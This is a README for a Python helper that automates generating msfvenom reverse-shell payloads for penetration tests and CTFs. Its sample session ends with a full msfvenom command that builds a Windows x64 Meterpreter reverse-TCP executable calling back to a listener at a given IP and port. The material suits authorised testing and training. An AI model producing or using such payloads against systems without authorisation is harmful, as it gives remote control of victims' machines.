# Payload Generator
[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)
[![python](https://img.shields.io/badge/python-3-blue.svg)](https://www.python.org/downloads/)

----

Python script to help automate the generation of malicious payloads for PenTests and CTFs


## How it Works

This script collects various information from the users input such as Listening IP and Port, Target OS, Type of shell, etc to craft an msfvenom reverse shell payload.

The main purpose of this script was to help with the synatx of common payloads paths that I just couldn't seem to remember, so this way I can just tell the script what I want and it builds the payload for me.

## Example Output

```
root@kali:~/Projects/payload_generator# ./main.py 
Payload Generator

[+] Finding currently used network adapters
eth0
lo
tun0

[++] Please choice which adapter you are using. tun0

Your IP address is...
10.8.1.254
[++] Please enter port you will be listening on. 4444

[+] Building payload...
   [++] Staged or Stageless? (1 or 2): 2
   [++] Meterpreter or Standard? (1 or 2): 1
   [++] Windows or Linux? (1 or 2): 1
   [++] x86 or x64? (1 or 2): 2

[+] Supported file types...
1 = .exe    5 = .aspx    9 = .py
2 = .elf    6 = .jsp    10 = .sh
3 = .php    7 = .war
4 = .asp    8 = .pl
   [++] Choose a supported file type: 1

Payload ready
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.1.254 LPORT=4444 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 206403 bytes
Final size of exe file: 212992 bytes
```
